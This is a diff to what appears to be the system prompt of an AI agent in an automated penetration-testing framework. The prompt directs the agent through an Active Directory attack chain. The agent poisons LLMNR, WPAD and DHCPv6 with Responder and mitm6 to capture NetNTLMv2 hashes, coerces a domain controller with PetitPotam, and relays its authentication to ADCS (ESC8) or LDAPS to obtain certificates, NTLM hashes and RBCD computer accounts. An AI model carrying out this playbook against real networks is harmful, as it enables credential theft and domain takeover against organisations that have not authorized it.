@@ -40,15 +40,11 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 ## Network Coercion
 
 ### Responder
-Primary tool for capturing hashes:
-```
-start_responder(
-    interface='<INTERFACE FROM TASK PROMPT>',
-    analyze_mode=False  # set True for passive
-)
-```
-Use the EXACT `interface` value from your task prompt — never guess (eth0 is
-rarely correct).
+Primary tool for capturing hashes. Call `start_responder` with `analyze_mode=False`
+(or `True` for passive) and the `interface` value taken verbatim from the task
+prompt. The orchestrator dispatches each coercion task with the correct
+interface in the payload — never guess (eth0 is rarely correct), never invoke
+this without first confirming the task prompt named an interface.
 
 Captures:
 - NetNTLMv2 hashes from LLMNR queries
@@ -56,13 +52,8 @@ Captures:
 - WPAD authentication
 
 ### mitm6
-IPv6-based attacks:
-```
-start_mitm6(
-    domain="{{ target_domain }}",
-    interface='<INTERFACE FROM TASK PROMPT>'
-)
-```
+IPv6-based attacks. Call `start_mitm6(domain="{{ target_domain }}", interface=...)`
+with the `interface` value from your task prompt — same constraint as Responder.
 
 Captures:
 - DNS takeover via IPv6
@@ -114,7 +105,7 @@ dfscoerce(
 
 ### For ADCS ESC8
 You handle the full ESC8 attack chain:
-1. Start `ntlmrelayx_to_adcs(ca_host='<CA FQDN FROM certipy_find OUTPUT>', attacker_ip="{{ listener_ip }}")`
+1. Start `ntlmrelayx_to_adcs` with `attacker_ip="{{ listener_ip }}"` and `ca_host` set to the CA FQDN reported by `certipy_find`. If `certipy_find` has not yet reported a CA, request a recon dispatch instead of guessing the CA host.
 2. Run `petitpotam(target="{{ target_dc_fqdn }}", listener="{{ listener_ip }}")` to coerce DC
 3. DC authenticates to relay, relay requests certificate from CA
 4. Certificate is saved, use `certipy_auth` (on privesc) to get NTLM hash
@@ -138,8 +129,8 @@ Relay to multiple SMB targets from a targets file:
 ### DHCPv6 + LDAP Relay (Create Computer for RBCD)
 Combine mitm6 with ntlmrelayx to create computer account:
 ```
-1. start_mitm6(domain="{{ target_domain }}", interface='<INTERFACE FROM TASK PROMPT>')
-   → Poison DHCPv6 responses
+1. Run `start_mitm6` with `domain="{{ target_domain }}"` and the interface
+   from your task payload — poisons DHCPv6 responses.
 2. ntlmrelayx_to_ldaps(dc_ip="{{ target_dc_ip }}", delegate_access=True)
    → Relay to LDAPS, create computer with RBCD rights
 3. Wait for machine authentication (WPAD requests)
